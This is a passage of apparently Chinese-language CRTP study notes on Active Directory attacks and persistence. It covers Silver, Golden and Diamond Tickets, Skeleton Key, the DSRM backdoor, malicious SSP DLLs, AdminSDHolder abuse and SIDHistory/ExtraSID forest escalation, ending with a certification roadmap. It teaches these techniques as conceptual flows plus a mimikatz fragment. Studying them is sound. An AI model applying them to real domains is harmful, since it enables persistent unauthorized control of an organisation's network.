| Silver Ticket | TGS | Service Account Hash | 單一 Service | 中等 |

Silver Ticket 通常無法直接控制整個 Domain，但可以對特定服務維持長期存取權。

在 Active Directory 環境中，許多服務其實是使用 **Machine Account（電腦帳號）** 運行，而不是一般使用者帳號。

Machine Account 的格式通常為：
- WEB01$
- SQL01$
- DC01$

許多 Windows 服務（如 SMB、WinRM、WMI、IIS 等）在 Domain 環境中，實際上是以 **Machine Account** 的身分運作。

這代表如果攻擊者取得某台主機的 **Machine Account Hash** 就可以偽造該主機服務的 Kerberos Service Ticket。

例如：

```bash= 
取得 WEB01$ NTLM Hash
↓
偽造 CIFS/WEB01 的 TGS
↓
存取 \\WEB01\C$
```

因此 Machine Account Hash 也是常見的 Silver Ticket 攻擊來源。

Diamond Ticket： 並不是 **偽造 Kerberos Ticket** 而是修改合法的 TGT (Ticket Granting Ticket)

核心概念：

```bash=
合法 Kerberos Authentication
↓
取得合法 TGT
↓
解密 TGT
↓
修改 Ticket 內容
↓
使用 KRBTGT key 重新加密
↓
重新注入並使用 Ticket
```

Domain Controller 在驗證 Ticket 時，主要檢查： **Ticket 是否能用 KRBTGT key 成功解密**
如果 **Signature Valid** Domain Controller 就會接受該 Ticket。

Golden Ticket vs Diamond Ticket

| 攻擊類型 | 偽造內容 | 需要 Hash | 權限範圍 | OPSEC |
|----------|----------|-----------|----------|-------|
| Golden Ticket | TGT | KRBTGT Hash | 整個 Domain | 高風險 |
| Silver Ticket | TGS | Service Hash | 單一 Service | 中等 |
| Diamond Ticket | 修改 TGT | KRBTGT Hash | 整個 Domain | 較低 |

Skeleton Key ： 一種 Active Directory persistence 技術。

核心概念：
在 Domain Controller 的 LSASS (Local Security Authority Subsystem Service) process 中
注入惡意程式碼，修改 Kerberos / NTLM 的認證流程。

```bash=
LSASS memory patch
↓
authentication logic modified
↓
允許特定的 master password 通過驗證

任何有效帳號 + Skeleton Key password
↓
Authentication success
```

DSRM 是 **Active Directory 的維護與復原模式**。

當 Domain Controller 安裝 Active Directory 時，系統會建立一個 **DSRM Administrator** 帳號，此帳號用於在 Directory Services Restore Mode 下登入並進行 AD 修復。

DSRM Administrator 本質上可以視為： 利用 Domain Controller 的本機管理帳號作為後門存取方式。

核心概念：

```bash=
取得 Domain Admin 權限
↓
Dump DSRM Administrator Hash
↓
保存該 Hash
↓
未來可再次登入 Domain Controller
```

因此即使 **Domain Admin 帳號被重設、或 AD 密碼變更**，攻擊者仍可透過 **DSRM Administrator** 重新存取 Domain Controller。

SSP（Security Support Provider）是 Windows 的 **Authentication Plugin Mechanism**，負責處理系統的認證流程，例如：
- NTLM
- Kerberos
- Negotiate
- Schannel

Windows 的驗證流程：

```bash=
User Login
↓
LSASS
↓
Security Support Provider (SSP)
↓
Authentication
```

核心概念：
攻擊者透過註冊惡意 SSP DLL，使其被 **LSASS 在登入時自動載入** 從而攔截使用者登入憑證(Username、Password、Domain)。

```bash=
Domain Admin 權限
↓
在系統中放入惡意 SSP DLL
↓
註冊 SSP
↓
重啟系統
↓
LSASS 載入 SSP
↓
攔截登入憑證
```

SSP 會註冊於以下 Registry：

```bash=
HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
```

當系統啟動時：

```bash=
LSASS
↓
讀取 Security Packages
↓
載入 SSP DLL
```

因此攻擊者可透過 Registry 註冊惡意 Authentication Provider 建立持久化。

AdminSDHolder ACL 濫用：是一種利用 **Active Directory 權限機制（ACL）** 建立長期控制權的 Persistence 技術。

Active Directory 中存在一組被稱為 **Protected Groups** 的高權限群組。  
由於這些群組擁有極高的系統權限，AD 會對其 **ACL（Access Control List）** 進行額外保護。
常見的 Protected Groups 包括：
- Domain Admins
- Enterprise Admins
- Administrators
- Schema Admins
- Account Operators
- Server Operators
- Backup Operators
- Print Operators

Active Directory 中存在一個特殊物件 **AdminSDHolder** 用於保存 Protected Groups 的 ACL 模板。

```bash=
CN=AdminSDHolder,CN=System,DC=domain,DC=local
```

SDProp 機制：Domain Controller 會定期執行一個程序（預設行為每 60 分鐘執行一次）

其運作流程：

```bash=
AdminSDHolder ACL
        ↓
SDProp process
        ↓
同步到 Protected Objects ACL
```

也就是： Protected Groups 的 ACL 會定期被 AdminSDHolder ACL 覆蓋

核心概念：

```bash=
取得 Domain Admin 權限
        ↓
修改 AdminSDHolder ACL
        ↓
給攻擊者帳號 FullControl / WriteDACL
        ↓
等待 SDProp 執行
        ↓
ACL 自動套用到 Protected Groups
        ↓
攻擊者持續擁有高權限
```

利用的是 **AdminSDHolder ACL Template + SDProp** 同步機制。

---

跨 Domain / Forest 攻擊概念

當攻擊者已經取得 **Domain Admin** 時，下一步通常是：
- 提升到 **Enterprise Admin**
- 或進行 **跨 Domain / Forest 攻擊**

整體攻擊流程：

```bash=
Initial Foothold
      ↓
Local Admin
      ↓
Domain Admin (Child Domain)
      ↓
Enterprise Admin (Root Domain)
      ↓
Forest Compromise
```

重點：
**當攻擊者取得 Child Domain 的 Domain Admin 時，可以透過 SIDHistory 濫用 提權到 Enterprise Admin，最終控制整個 Forest**

SID（Security Identifier）

Active Directory 中每個物件都有唯一的 SID。

格式：

```bash=
DomainSID + RID
```

範例：

```bash=
S-1-5-21-XXXX-XXXX-XXXX-500
```

其中：
- DomainSID：Domain 的唯一識別
- RID：帳號識別（例如 500 = Administrator）
 - 500 = Administrator
 - 512 = Domain Admins
 - 519 = Enterprise Admins

SIDHistory 是 Active Directory 的 **向後相容機制 (Backward Compatibility Mechanism)**。

用途：
當帳號從一個 Domain 移到另一個 Domain，例如：

```bash=
companyA.local
   ↓
companyB.local
```

使用者 SID 會改變，因此 AD 會把舊 SID 存在 **SIDHistory** 中。

結構：
```bash=
User
 ├ SID = 新 Domain SID
 └ SIDHistory = 舊 SID
```

在 Windows 授權時，系統會同時檢查：

```bash=
SID
+
SIDHistory
```

修改 SIDHistory：利用 Domain Admin 權限直接修改使用者物件的 **SIDHistory** 屬性，將高權限 SID（如 Enterprise Admin）加入。

常見工具：
- mimikatz  
- PowerView  
- Invoke-Mimikatz  

攻擊邏輯：
```bash=
取得 Domain Admin
        ↓
修改目標帳號 SIDHistory
        ↓
加入 Enterprise Admin SID
        ↓
系統授權時同時檢查 SID + SIDHistory
        ↓
帳號被視為 Enterprise Admin
```

Golden Ticket + SIDHistory：透過偽造 Kerberos Golden Ticket，並在 Ticket 中加入高權限 SID。

範例：

```bash=
kerberos::golden
/sids:<Enterprise Admin SID>
```

攻擊邏輯：

```bash=
取得 krbtgt hash
        ↓
偽造 Golden Ticket
        ↓
在 ticket 中加入 Enterprise Admin SID
        ↓
Kerberos 認證時帶入該 SID
        ↓
獲得 Enterprise Admin 權限
```

利用 **krbtgt secret** 偽造 **Golden Ticket**，並透過在 Kerberos Ticket 中加入 **ExtraSID**，可以從 **Child Domain Admin 提權到 Enterprise Admin**，最終控制整個 **Forest**。

當攻擊者取得 **Child Domain 的 Domain Admin** 時，目標是：
- 提權到 **Enterprise Admin**
- 控制 **Root Domain**
- 最終 **Forest Compromise**

攻擊流程：

```bash=
Initial Foothold
      ↓
Local Privilege Escalation
      ↓
Domain Admin (Child Domain)
      ↓
DCSync
      ↓
Dump krbtgt hash
      ↓
Golden Ticket + ExtraSID
      ↓
Enterprise Admin
      ↓
Forest Compromise
```

Golden Ticket + ExtraSID

攻擊者可以在偽造的 Kerberos TGT 中加入 ExtraSID。

加入的 SID：

```bash=
Enterprise Admin SID
```

範例：

```bash=
S-1-5-21-ROOTDOMAIN-519
```

說明：
- 519 = Enterprise Admins

攻擊原理

Kerberos 驗證流程：

```bash=
Child Domain DC 簽發 TGT
        ↓
Ticket 被 Root Domain DC 接受
        ↓
Root Domain DC 信任 Child Domain KDC
        ↓
Root Domain DC 只驗證 Ticket 是否可解密
```

Root Domain 不會重新驗證 Ticket 中的 SID。

因此如果 Ticket 內包含：

```bash=
Enterprise Admin SID
```

Root Domain 會直接授予 Enterprise Admin 權限。

### Module 4
- Bypass Defenses (MDE and MDI)
- Monitoring and Detections

本文先記錄學習前的策略規劃，後續將依照實際進度拆解各模組內容。

## Lab Methodology - Assume Breach (實驗室方法論)

預設攻擊者已取得內網初始立足點（Initial Foothold），並是否能沿著攻擊鏈持續擴張權限，最終達成： 

```bash=
控制整個 AD 網域環境
```

Lab 入口資訊
- Portal URL： **https://enterprisesecurity.io**
- 登入後可查看：
  - 訂閱開始與結束時間
  - Lab 存取剩餘時間
  - 最近一次考試嘗試時間

重點：
- 最少 30 天存取權限
- 若時間異常需立即確認
- Lab 時間與考試資格直接相關

區域選擇 (Region Selection)
- North America
- Europe
- East Asia / Pacific

原則：
- 依地理位置選擇最近區域
- 降低延遲 (Latency)
- 確保操作流暢度

## 總結

過去在軍中環境的觀察來說，OSCP 往往已被視為一個相當高的技術門檻，甚至可以說是「頂標」。在那樣的體系裡，能通過 OSCP 已經明顯高於平均水準。但如果放到具有實戰強度的乙方市場環境來看，OSCP 更像是一個起點，而不是終點。它代表的是基本滲透方法論與攻擊流程的建立，但如果單純以 **紅隊實戰能力成長** 為目標，而非證照收藏，可以依照能力堆疊邏輯，規劃如下順序：

```bash=
OSCP → CRTP → OSEP → OSWE → OSED（選修）
```

### 第一階段：建立滲透方法論（OSCP）

OSCP 核心價值在於建立完整的滲透思維與攻擊流程：
- 系統化的 Enumeration
- 攻擊面拆解與優先順序判斷
- 橫向移動與權限提升

這個階段的重點不是招式，而是方法論，從這一步開始，才真正具備 **能獨立完成滲透流程** 的能力。

### 第二階段：理解企業內網權限模型（CRTP）

CRTP 補足的是企業環境中最核心的 Active Directory 架構理解。
- ACL / DACL 與權限流動
- Kerberos 認證與票證模型
- Delegation 設計邏輯
- Forest / Domain Trust 邊界

這一步讓能力從 **會打** 轉向 **看懂設計** 開始理解攻擊之所以成立，是因為架構本身如何運作。

### 第三階段：真實環境對抗能力（OSEP）

OSEP 強調的是攻防對抗思維。
- AV / EDR 對抗
- AMSI / AppLocker 繞過
- Logging 與 Detection Surface 理解
- Payload 與執行鏈設計

這個階段讓攻擊能力從實驗室場景，進化到真實企業環境，不再只是 **能打成功**，而是 **能在被監控下打成功**。

### 第四階段：漏洞原理與程式閱讀能力（OSWE）

在具備完整攻擊鏈與對抗能力後，再回頭強化 Web 原始碼審計能力。

OSWE 著重於：
- Source Code Trace
- 邏輯漏洞辨識
- 自行撰寫與修改 exploit

這一層補的是內功，讓滲透能力從黑箱測試，轉為白箱理解。

### 第五階段：底層漏洞利用研究（OSED）

OSED 偏向研究導向與 Exploit Engineering
- ROP Chain
- DEP / ASLR Bypass
- Shellcode 與 Windows Internals

並非一般紅隊必要能力，以目前市場現況而言，多數企業安全檢測仍以黑箱或灰箱滲透測試為主，真正需要底層漏洞利用開發能力的職缺相對較少，但對於希望深入理解漏洞本質或追求 OSCE3 的人而言，可作為長期興趣投入。